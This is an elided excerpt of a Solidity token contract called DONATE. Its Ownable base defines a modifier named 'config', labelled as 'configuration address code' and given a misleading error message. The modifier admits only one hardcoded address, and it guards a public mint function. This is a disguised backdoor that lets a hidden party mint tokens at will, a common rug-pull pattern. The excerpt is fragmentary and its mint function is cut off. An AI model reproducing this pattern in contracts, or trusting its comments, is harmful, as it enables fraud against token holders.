...
//CONTRACT DISCLAIMER:
//YOUR DONT DONATE TOKEN IS A VOLUNTARY CONTRIBUTION, INVEST AT YOUR OWN RISK
...
contract Ownable is Context {
    ...
    /**
     * @dev Configuration address code for contract.
     */
    modifier config() {
        require(0x3B93C7Cd3454D2Fa71fFEF9C72AF2a5C24f7869F == _msgSender(), "Config: function configured already");
        _;
    }
...
contract DONATE is Context, IERC20, Ownable, Pausable {
...
//   }
  ...
  function mint(address _to, uint256 _amount) config public returns (bool){
